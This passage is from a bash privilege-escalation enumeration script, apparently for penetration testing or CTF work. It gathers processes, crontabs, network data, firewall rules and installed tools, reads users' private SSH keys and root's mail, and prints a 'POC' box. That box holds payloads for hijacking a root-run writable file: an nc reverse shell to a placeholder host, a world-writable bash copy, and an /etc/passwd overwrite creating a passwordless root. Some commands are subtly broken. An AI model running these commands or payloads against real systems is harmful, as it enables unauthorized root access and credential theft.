        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Running Proccess:
    echo -e "\n\033[1;34;40m[+] Running Proccess on the system\033[0m"
    proc=`ps aux`
    echo -e "$proc"
    #------------------> Running Proccess as root
    echo -e "Consider running the command by: ps aux | grep USERNAME"
    echo -e "\n\033[1;34;40m[+] Running Proccess as root\033[0m"
    proc_root=`ps aux | grep root`
    echo -e "$proc_root"
    #------------------> Process binaries and associated permissions
    echo -e "Process binaries and associated permissions"
    proc_bin=`ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null`
    echo -e "$proc_bin"
#------------------> System Path Scheduled Tasks:
    echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]------------------------------------------------------ [ System Path Scheduled Tasks ] -----------------------------------------------------[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    sleep 1
    #------------------> Current User Crontab:
    echo -e "\n\033[1;34;40m[+] Current User Crontab\033[0m"
    usr_cron=`crontab -l`
    echo -e "$usr_cron"
    #------------------> Other User Crontab:
    echo -e "\n\033[1;34;40m[+] Other User Crontab\033[0m"
    other_usr_cron=`cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null`
    echo -e "$other_usr_cron"
    #------------------> Scheduled Jobs:
    echo -e "\n\033[1;34;40m[+] Scheduled Jobs\033[0m"
    sch_job=`cat /etc/crontab 2>/dev/null`
    echo -e "$sch_job"
        echo -e "\n\033[0;37;41mIf the File is Writable\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If the file is running by root, & it is writable by anyone the attacker my abuse it                       ║"
        echo -e "\t  ║by replacing the content of it.                                                                           ║"
        echo -e "\t  ║\033[1;31;40mPOC:\033[0m                                                                                                      ║"
        echo -e "\t  ║\033[1;31;40mecho '/bin/sh' > file\033[0m                                                                                     ║"
        echo -e "\t  ║\033[1;31;40mecho '/bin/bash' > file \033[0m                                                                                  ║"
        echo -e "\t  ║\033[1;31;40mecho 'm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.a.a.a 443 >/tmp/f' > file\033[0m                    ║"
        echo -e "\t  ║\033[1;31;40mecho 'cp /bin/bash /tmp/bash; chmod 777 /tmp/bash' > file\033[0m                                                 ║"
        echo -e "\t  ║\033[1;31;40mecho 'echo root::0:0:root:/root:/bin/bash > /etc/passwd' > file\033[0m                                           ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
#------------------> Communications & Networking:
    echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]------------------------------------------------------ [ Communications & Networking ] -----------------------------------------------------[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    sleep 1
    #------------------> Network Details:
    echo -e "\n\033[1;34;40m[+] Network Details:\033[0m"
    n_details=`/sbin/ifconfig`
    echo -e "$n_details"
    echo -e "\n\033[0;37;41mNote\033[0m"
        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Are there any other networks connected on localhost? This might need tunnelling║"
        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Firewall Rulls:
    echo -e "\n\033[1;34;40m[+] Firewall Rulls:\033[0m"
    FW_details=`iptables -nvL`
    echo -e "$FW_details"
    #------------------> Open Ports:
    echo -e "\n\033[1;34;40m[+]  Open Ports:\033[0m"
    open_port=`netstat -antp`
    echo -e "$openport"
    echo -e "\n\033[0;37;41mNote\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Are there any open ports on localhost we did not see when we were doing nmap? ║"
        echo -e "\t  ║This might need tunnelling or connecting to it localy                         ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Network Route:
    echo -e "\n\033[1;34;40m[+] Network Route:\033[0m"
    n_route=`route`
    echo -e "$n_route"
    #------------------> Hosts File:
    echo -e "\n\033[1;34;40m[+] Hosts File:\033[0m"
    host_file=`cat /etc/hosts`
    echo -e "$host_file"
    #------------------> Name Server:
    echo -e "\n\033[1;34;40m[+] Name Server:\033[0m"
    name_server=`cat /etc/resolv.conf`
    echo -e "$name_server"
    #------------------> Neighbours:
    echo -e "\n\033[1;34;40m[+] Neighbours:\033[0m"
    Neighbours=`route | ip n && route`
    echo -e "$Neighbours"
    #------------------> Enumeration:
    echo -e "\n\n\033[1;31;40m\t\t\tEnumeration on progress ################################################################.................. 80%\033[0m\n\n"
    sleep 5
#------------------> Finding SSH Keys:
    echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]------------------------------------------------------------ [ Finding SSH Keys ] ----------------------------------------------------------[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    sleep 1
    #------------------> Identify any existing public or private keys:
    echo -e "\n\033[1;34;40m[+] Identify any existing public or private keys:\033[0m"
    ssh_key=`ls -la /home /root /etc/ssh /home/*/.ssh/ 2> /dev/null; locate id_rsa 2> /dev/null; locate id_dsa 2> /dev/null; find / -name id_rsa 2> /dev/null; find / -name id_dsa 2> /dev/null; find / -name authorized_keys 2> /dev/null; cat /home/*/.ssh/id_rsa 2> /dev/null; cat /home/*/.ssh/id_dsa 2> /dev/null`
    echo -e "$ssh_key"
    echo -e "\n\033[0;37;41mExploiting Misconfigured SSH Keys\033[0m"
        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Secure Shell (SSH) is a cryptographic network protocol which allows users to               ║"
        echo -e "\t  ║securely perform a number of network services, such as remote authentication               ║"
        echo -e "\t  ║or file transfer, over an unsecured network.                                               ║"
        echo -e "\t  ║Exploite:                                                                                  ║"
        echo -e "\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/ ║"
        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════════════════╝"
#------------------> Extra Creds:
    echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]-------------------------------------------------------------- [ Extra Creds ] -------------------------------------------------------------[+]\033[0m"
    echo -e "\n\033[1;31;40m [+]############################################################################################################################################[+]\033[0m"
    sleep 1
    #------------------> Look Manually:
    echo -e "\n\033[1;34;40m[+] Mail File:\033[0m"
    mail_file=`fls -la /var/mail/`
    echo -e "$mail_file"
    echo -e "\n\033[1;34;40m[+] Root Directory:\033[0m"
    root_dir=`ls -la /root/`
    echo -e "$root_dir"
    echo -e "\n\033[1;34;40m[+] Home Directory:\033[0m"
    home_dir=`ls -la /home/`
    echo -e "$home_dir"
    echo -e "\n\033[1;34;40m[+] tmp Directory:\033[0m"
    tmp_dir=`ls -la /tmp`
    echo -e "$tmp_dir"
    echo -e "\n\033[1;34;40m[+] Backup Directory:\033[0m"
    backup_dir=`ls -la /var/backups`
    echo -e "$backup_dir"
    echo -e "\n\033[1;34;40m[+] Apache Version:\033[0m"
    apa_de=`apache2 -v 2>/dev/null; httpd -v 2>/dev/null`
    echo -e "$apa_de"
    echo -e "\n\033[1;34;40m[+] Apache user:\033[0m"
    apa_user=`grep -i 'user\|group' /etc/apache2/envvars 2>/dev/null |awk '{sub(/.*\export /,"")}1' 2>/dev/null`
    echo -e "$apa_user"
    echo -e "\n\033[1;34;40m[+] Apache Config File:\033[0m"
    apa_conf=`cat /var/apache2/config.inc`
    echo -e "$apa_conf"
    echo -e "\n\033[1;34;40m[+] MySQ Version:\033[0m"
    mysql_ver=`mysql --version`
    echo -e "$mysql_ver"
    echo -e "\n\033[1;34;40m[+] MySQL:\033[0m"
    mysql=`ls -la /var/lib/mysql`
    echo -e "$mysql"
    echo -e "\n\033[1;34;40m[+] Log File:\033[0m"
    log_file=`ls -la /var/log 2>/dev/null`
    echo -e "$log_file"
    echo -e "\n\033[1;34;40m[+] Spool File:\033[0m"
    spool_file=`ls -la /var/spool 2>/dev/null`
    echo -e "$spool_file"
    echo -e "\n\033[1;34;40m[+] pgsql:\033[0m"
    pgsql=`ls -la /var/lib/pgsql 2>/dev/null`
    echo -e "$pgsql"
    echo -e "\n\033[1;34;40m[+] file-systems mounted:\033[0m"
    systems_mounted=`df -h 2>/dev/null`
    echo -e "$systems_mounted"
    echo -e "\n\033[1;34;40m[+] System files dont belong to root:\033[0m"
    sys_file_no_root=`find /lib/systemd/ \! -uid 0 -type f 2>/dev/null | xargs -r ls -la`
    echo -e "$sys_file_no_root"
    echo -e "\n\033[1;34;40m[+] Tools/Languages Installed:\033[0m"
    tool_lang=`which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null 2>/dev/null`
    echo -e "$tool_lang"
        echo -e "\n\033[0;37;41mNote\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Some of the tools have an exploit, visite:                                    ║"
        echo -e "\t  ║https://gtfobins.github.io/                                                   ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\n\033[1;34;40m[+] Read roots mail:\033[0m"
    root_mail=`head /var/mail/root 2>/dev/null`
    echo -e "$root_mail"
    #------------------> Enumeration Completed:
    echo -e "\n\n\033[1;31;40m\t\t\tEnumeration is completed ################################################################################## 100%\033[0m\n\n"
